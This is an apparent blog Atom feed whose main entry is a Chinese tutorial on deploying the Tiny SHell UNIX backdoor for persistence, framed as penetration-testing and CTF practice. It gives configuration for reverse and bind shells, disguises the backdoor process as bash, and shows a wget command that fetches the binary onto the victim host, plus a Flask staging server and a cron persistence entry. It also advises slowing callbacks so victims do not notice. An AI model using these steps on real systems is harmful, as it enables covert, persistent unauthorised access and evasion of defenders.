<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nobody&#39;s Blog</title>
  
  
  <link href="https://qwegz.github.io/atom.xml" rel="self"/>
  
  <link href="https://qwegz.github.io/"/>
  <updated>2025-02-09T08:05:47.773Z</updated>
  <id>https://qwegz.github.io/</id>
  
  <author>
    <name>nobody</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>tsh后门使用教程</title>
    <link href="https://qwegz.github.io/2025/02/07/tsh%E5%90%8E%E9%97%A8%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <id>https://qwegz.github.io/2025/02/07/tsh%E5%90%8E%E9%97%A8%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</id>
    <published>2025-02-07T11:35:10.000Z</published>
    <updated>2025-02-09T08:05:47.773Z</updated>
    
    <content type="html"><![CDATA[<p>在我们进行渗透测试或者是CTF的AWD模式时，都需要做权限驻留，这里介绍一款开源的UNIX后门</p><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p><code>Tiny SHell - An open-source UNIX backdoor</code>​</p><p>tsh是一款开源的UNIX后门，能后提供正向连接或反弹连接模式，通信加密，且支持上传、下载。</p><p><a href="https://github.com/orangetw/tsh">源码</a>非常精简</p><p><img src="/assets/image-20240823201052-coltmqz.png" alt="image">​</p><h2 id="使用前的准备工作"><a href="#使用前的准备工作" class="headerlink" title="使用前的准备工作"></a>使用前的准备工作</h2><h3 id="修改tsh-h"><a href="#修改tsh-h" class="headerlink" title="修改tsh.h"></a>修改tsh.h</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _TSH_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _TSH_H</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *secret = <span class="string">&quot;replace with your password&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SERVER_PORT 7586</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_PROC_NAME <span class="string">&quot;/bin/bash&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONNECT_BACK_HOST  <span class="string">&quot;localhost&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONNECT_BACK_DELAY 30</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_FILE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_FILE 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RUNSHELL 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* tsh.h */</span></span></span><br></pre></td></tr></table></figure><p><code>secret</code>​是用于加密通信流量的密钥，每次使用前建议修改</p><p><code>SERVER_PORT</code>​是后门运行时监听的端口</p><p><code>FAKE_PROC_NAME</code>​是伪装后门运行时的进程名字，我一般使用<code>/usr/sbin/bash</code>​</p><p><code>CONNECT_BACK</code>​指的是反弹连接模式用到的信息，如果需要编译主动连接模式则注释掉这2行</p><p><code>CONNECT_BACK_HOST</code>​是反弹shell的控制端IP</p><p><code>CONNECT_BACK_DELAY</code>​是休眠时间，单位是秒，即每多少秒反弹一次（sleep函数在死循环第一行，启动后直接休眠）</p><h4 id="正向连接示例"><a href="#正向连接示例" class="headerlink" title="正向连接示例"></a>正向连接示例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _TSH_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _TSH_H</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *secret = <span class="string">&quot;Pass2pAssword1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SERVER_PORT 7999</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_PROC_NAME <span class="string">&quot;/usr/sbin/bash&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#define CONNECT_BACK_HOST  &quot;1.1.1.1&quot;</span></span><br><span class="line"><span class="comment">//#define CONNECT_BACK_DELAY 21600</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_FILE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_FILE 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RUNSHELL 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* tsh.h */</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>‍</p><h4 id="反弹连接示例"><a href="#反弹连接示例" class="headerlink" title="反弹连接示例"></a>反弹连接示例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _TSH_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _TSH_H</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *secret = <span class="string">&quot;Pass2pAssword1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SERVER_PORT 7999</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_PROC_NAME <span class="string">&quot;/usr/sbin/bash&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONNECT_BACK_HOST  <span class="string">&quot;1.1.1.1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONNECT_BACK_DELAY 21600</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_FILE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_FILE 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RUNSHELL 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* tsh.h */</span></span></span><br></pre></td></tr></table></figure><p>‍</p><h3 id="修改tsh-c"><a href="#修改tsh-c" class="headerlink" title="修改tsh.c"></a>修改tsh.c</h3><p><img src="/assets/image-20240823202500-7v3gl98.png" alt="image">​</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">: tsh_runshell( server, <span class="string">&quot;exec bash --login&quot;</span> ) );</span><br></pre></td></tr></table></figure><p>236行这里这里直接调用系统命令 bash，但如果被控端的环境变量 <code>PATH</code>​ 值中我们的后门程序<code>/usr/sbin/bash</code>​要优先于真bash，则会<code>exec</code>​失败，所以修改为绝对路径<code>/bin/bash</code>​最好，修改后内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">: tsh_runshell( server, <span class="string">&quot;exec /bin/bash --login&quot;</span> ) );</span><br></pre></td></tr></table></figure><h3 id="修改Makefile"><a href="#修改Makefile" class="headerlink" title="修改Makefile"></a>修改Makefile</h3><p>Makefile文件中支持了很多的UNIX系统，如<code>linux, freebsd, openbsd</code>​，目前我只用过<code>make linux</code>​编译，默认的编译命令为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">linux:</span><br><span class="line">        gcc -O -W -Wall -o tsh  $(CLIENT_OBJ)</span><br><span class="line">        gcc -O -W -Wall -o tshd $(SERVER_OBJ) -lutil -DLINUX</span><br><span class="line">        strip tsh tshd</span><br></pre></td></tr></table></figure><p>问题在于受害者机器上运行的<code>tshd</code>​需要进行<code>static</code>​静态编译，以兼容各种环境，所以修改为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">linux:</span><br><span class="line">gcc -O -W -Wall -<span class="type">static</span> -o tsh $(CLIENT_OBJ)</span><br><span class="line">gcc -O -W -Wall -<span class="type">static</span> -o tshd $(SERVER_OBJ) -<span class="type">static</span>-libgcc -<span class="type">static</span>-libstdc++ -lutil -DLINUX</span><br><span class="line">strip tsh tshd</span><br></pre></td></tr></table></figure><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><p>首先编译，生成<code>tsh</code>​和<code>tshd</code>​两个文件，其中<code>tshd</code>​是受害者机器上运行的，<code>tsh</code>​是控制端使用的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make linux</span><br></pre></td></tr></table></figure><h3 id="测试环境说明"><a href="#测试环境说明" class="headerlink" title="测试环境说明"></a>测试环境说明</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">控制端ip 192.168.122.133</span><br><span class="line">受害者ip 192.168.122.128</span><br></pre></td></tr></table></figure><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>一般将<code>tshd</code>​重命名为<code>bash</code>​，放在受害者机器的<code>/usr/sbin</code>​目录下面，给<code>/usr/sbin/bash</code>​文件执行权限，然后执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">umask</span> 077; HOME=/var/tmp; /usr/sbin/bash</span><br></pre></td></tr></table></figure><p><code>umask</code>​设置是为了运行后的后门<code>shell</code>​环境而设置，后门<code>shell</code>​所有创建的文件只有后门<code>shell</code>​进程属主有权限，其他都没权限</p><p>然后在控制端上运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tsh 192.168.122.128</span><br></pre></td></tr></table></figure><p>效果图</p><p><img src="/assets/image-20240823212729-7gyk0m0.png" alt="image">​</p><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p><code>tsh.h</code>​中确保控制端IP正确，同样编译</p><p>首先在控制端上运行，开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tsh cb</span><br></pre></td></tr></table></figure><p>一般将<code>tshd</code>​重命名为<code>bash</code>​，放在受害者机器的<code>/usr/sbin</code>​目录下面，给<code>/usr/sbin/bash</code>​文件执行权限，然后执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">umask</span> 077; HOME=/var/tmp; /usr/sbin/bash</span><br></pre></td></tr></table></figure><p>效果图如下，等待<code>CONNECT_BACK_DELAY</code>​秒</p><p><img src="/assets/image-20240823213517-a7utcqg.png" alt="image">​</p><h2 id="额外说明"><a href="#额外说明" class="headerlink" title="额外说明"></a>额外说明</h2><h3 id="提供下载的web服务python脚本"><a href="#提供下载的web服务python脚本" class="headerlink" title="提供下载的web服务python脚本"></a>提供下载的web服务python脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, send_from_directory</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download/&lt;path:filename&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="comment"># 使用 os.path.abspath 和 os.path.commonprefix 来避免目录穿越</span></span><br><span class="line">    base_dir = os.path.abspath(<span class="string">&#x27;.&#x27;</span>)  <span class="comment"># 当前目录的绝对路径</span></span><br><span class="line">    file_path = os.path.abspath(os.path.join(base_dir, filename))</span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 检查文件路径是否位于当前目录内</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file_path.startswith(base_dir):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 如果文件存在，则允许下载；否则返回 404 错误</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file_path):</span><br><span class="line">        <span class="keyword">return</span> send_from_directory(directory=base_dir, path=filename, as_attachment=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>很多时候需要用<code>wget</code>​命令下载tshd到受害者机器上，现在给出一个简单的python脚本提供web下载服务，将需要下载的文件放在同一目录即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup python3 app.py &gt; output.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</span><br></pre></td></tr></table></figure><p>然后wget下载文件到<code>/usr/sbin</code>​目录下即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O /usr/sbin/bash http://<span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span>:<span class="number">5000</span>/download/bash</span><br></pre></td></tr></table></figure><h3 id="添加计划任务"><a href="#添加计划任务" class="headerlink" title="添加计划任务"></a>添加计划任务</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>打开编辑器，添加一条每天凌晨4点运行<code>/usr/sbin/bash</code>​，保存即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">4</span> * * * /usr/sbin/bash</span><br></pre></td></tr></table></figure><h3 id="反向连接的延迟时间"><a href="#反向连接的延迟时间" class="headerlink" title="反向连接的延迟时间"></a>反向连接的延迟时间</h3><p><code>CONNECT_BACK_DELAY</code>​的单位是秒，如果延迟时间过短，频率过高的反弹流量，可能会被受害者发现，建议降低频率</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://cloud.tencent.com/developer/article/1047029">短小精干的Unix类后门Tiny shell的使用与分析</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在我们进行渗透测试或者是CTF的AWD模式时，都需要做权限驻留，这里介绍一款开源的UNIX后门&lt;/p&gt;
&lt;h2 id=&quot;基本介绍&quot;&gt;&lt;a href=&quot;#基本介绍&quot; class=&quot;headerlink&quot; title=&quot;基本介绍&quot;&gt;&lt;/a&gt;基本介绍&lt;/h2&gt;&lt;p&gt;&lt;code&gt;T</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://qwegz.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="权限维持" scheme="https://qwegz.github.io/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>我的第一篇文章</title>
    <link href="https://qwegz.github.io/2025/02/07/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
    <id>https://qwegz.github.io/2025/02/07/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</id>
    <published>2025-02-07T11:04:21.000Z</published>
    <updated>2025-02-07T11:18:45.624Z</updated>
    
    <content type="html"><![CDATA[<p>后续我会在这个博客里更新我的CTF比赛题解和攻防积累所得</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;后续我会在这个博客里更新我的CTF比赛题解和攻防积累所得&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
</feed>
